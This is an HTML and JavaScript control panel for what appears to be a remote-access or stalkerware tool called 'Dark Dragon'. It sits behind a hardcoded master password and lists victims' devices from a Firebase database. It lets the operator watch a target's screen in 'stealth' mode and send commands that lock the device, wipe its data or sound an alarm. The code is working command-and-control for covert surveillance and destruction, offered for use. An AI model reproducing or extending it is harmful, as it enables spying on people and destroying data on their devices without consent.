<!DOCTYPE html>
<html lang="si">
<head>
    <meta charset="UTF-8">
    <title>DARK DRAGON | SUPREME MASTER v6.5</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        /* උඹේ පරණ Styles ඔක්කොම තියෙනවා, මම අලුත් Glow Effect එකක් ඇඩ් කළා */
        :root { --neon-red: #ff0000; --dark-red: #440000; --bg: #050000; --cyan: #00ffff; --gold: #ffd700; --green: #00ff00; }
        body { background: var(--bg); color: var(--neon-red); font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
        #matrixCanvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.2; }
        
        /* Dashboard Styling */
        #dashboard { display: none; height: 100vh; overflow-y: auto; }
        .tabs { display: flex; background: #0a0000; border-bottom: 2px solid var(--neon-red); sticky: top; }
        .tab { padding: 15px; cursor: pointer; font-size: 11px; border-right: 1px solid var(--dark-red); transition: 0.3s; }
        .tab.active { background: var(--neon-red); color: black; font-weight: bold; }
        
        /* Monitor Section */
        .live-stream { width: 100%; height: 400px; background: #000; border: 2px solid var(--cyan); margin-bottom: 10px; display: flex; align-items: center; justify-content: center; position: relative; }
        #live-screen-img { max-width: 100%; max-height: 100%; object-fit: contain; }
        .stealth-indicator { position: absolute; top: 10px; right: 10px; color: var(--green); font-size: 10px; animation: blink 1s infinite; }
        @keyframes blink { 0% {opacity: 1;} 50% {opacity: 0.2;} 100% {opacity: 1;} }
        
        /* Layout */
        .container { padding: 20px; display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 20px; }
        .card { background: rgba(15, 0, 0, 0.9); border: 1px solid var(--dark-red); padding: 15px; border-radius: 5px; }
        button { background: #220000; color: var(--neon-red); border: 1px solid var(--neon-red); padding: 10px; cursor: pointer; font-size: 11px; margin: 2px; }
        button:hover { background: var(--neon-red); color: black; }
        .btn-war { border-color: var(--cyan); color: var(--cyan); font-weight: bold; }
    </style>
</head>
<body>

<canvas id="matrixCanvas"></canvas>

<div id="login-box" style="position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); border:2px solid red; padding:50px; background:black; text-align:center;">
    <h2 style="color:var(--neon-red)">DRAGON SUPREME ACCESS</h2>
    <input type="password" id="master-code" placeholder="ENTER MASTER CODE" style="background:#110000; color:red; border:1px solid red; padding:10px;"><br><br>
    <button onclick="unlock()">AUTH & UNLOCK SYSTEM</button>
</div>

<div id="dashboard">
    <header style="text-align:center; padding:10px; border-bottom:1px solid red;">
        <h3>DRAGON COMMAND CENTER [SUPREME MASTER v6.5]</h3>
        <div style="font-size:12px; color:var(--cyan)">TARGET: <span id="target-id-display">NONE</span> | STATUS: <span id="target-status-display">DISCONNECTED</span></div>
    </header>

    <div class="tabs">
        <div class="tab active" onclick="showTab('nodes')">👥 NODES</div>
        <div class="tab" onclick="showTab('spy')">👁️ LIVE SPY</div>
        <div class="tab" onclick="showTab('war')">⚔️ WAR MODE</div>
        <div class="tab" onclick="showTab('data')">📂 EXTRACT</div>
    </div>

    <div class="container">
        <div id="spy" class="panel" style="display:none; grid-column: 1/-1;">
            <div class="card">
                <h3>📺 STEALTH LIVE MONITOR</h3>
                <div class="live-stream">
                    <div class="stealth-indicator" id="stealth-mode">🛰️ STEALTH ACTIVE</div>
                    <img id="live-screen-img" src="">
                    <span id="wait-msg">WAITING FOR TARGET...</span>
                </div>
                <button onclick="sendCmd('take_screenshot')">REFRESH SCREEN</button>
                <button class="btn-war" onclick="sendCmd('start_stream')">START LIVE STREAM</button>
                <button onclick="sendCmd('stop_stream')">STOP STREAM</button>
            </div>
        </div>

        <div id="war" class="panel" style="display:none;">
            <div class="card">
                <h3>☣️ SYSTEM DESTRUCTION</h3>
                <button class="btn-war" onclick="sendCmd('nuclear_lock')">NUCLEAR LOCKDOWN</button>
                <button style="color:white; background:red;" onclick="sendCmd('wipe_data')">FULL WIPE DATA</button>
                <button onclick="sendCmd('max_vol_alarm')">PLAY MAX ALARM</button>
            </div>
        </div>

        <div id="nodes" class="panel">
            <div class="card" style="grid-column: 1/-1;">
                <h3>👥 ACTIVE TARGETS</h3>
                <table id="victim-table" style="width:100%; color:white; font-size:12px;">
                    </table>
            </div>
        </div>
    </div>
</div>

<script>
    // --- FIREBASE CONFIG ---
    const firebaseConfig = { 
        databaseURL: "https://dark-dragon-team-default-rtdb.firebaseio.com/" 
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    let activeTarget = null;

    function unlock() {
        const code = document.getElementById('master-code').value;
        if(code === "Akindu@Dewshan20241118") { // උඹේ රහස් කේතය
            document.getElementById('login-box').style.display = 'none';
            document.getElementById('dashboard').style.display = 'block';
            startMatrix();
            loadNodes();
        } else { alert("ACCESS DENIED!"); }
    }

    function loadNodes() {
        db.ref('victims').on('value', (snap) => {
            const table = document.getElementById('victim-table');
            table.innerHTML = "<tr><th>ID</th><th>DEVICE</th><th>STATUS</th><th>ACTION</th></tr>";
            snap.forEach(child => {
                const v = child.val();
                table.innerHTML += `<tr>
                    <td>${v.target}</td>
                    <td>${v.model}</td>
                    <td style="color:lime">ONLINE</td>
                    <td><button onclick="selectNode('${child.key}')">CONNECT</button></td>
                </tr>`;
            });
        });
    }

    function selectNode(id) {
        activeTarget = id;
        document.getElementById('target-id-display').innerText = id;
        document.getElementById('target-status-display').innerText = "CONNECTED";
        
        // පින්තූර ස්ට්‍රීම් එක ලයිව් බලන්න
        db.ref('screens/' + id).on('value', (snap) => {
            if(snap.val()) {
                document.getElementById('live-screen-img').src = snap.val().img;
                document.getElementById('wait-msg').style.display = 'none';
            }
        });
    }

    function sendCmd(action) {
        if(!activeTarget) return alert("SELECT A TARGET FIRST!");
        db.ref('commands/' + activeTarget).set({
            action: action,
            time: Date.now()
        });
    }

    function showTab(id) {
        document.querySelectorAll('.panel').forEach(p => p.style.display = 'none');
        document.getElementById(id).style.display = 'grid';
    }

    // Matrix Background Logic
    function startMatrix() {
        const canvas = document.getElementById('matrixCanvas');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        const columns = Math.floor(canvas.width / 20);
        const drops = Array(columns).fill(1);
        setInterval(() => {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#f00';
            drops.forEach((y, i) => {
                ctx.fillText(String.fromCharCode(Math.random() * 128), i * 20, y * 20);
                if (y * 20 > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            });
        }, 50);
    }
</script>
</body>
</html>
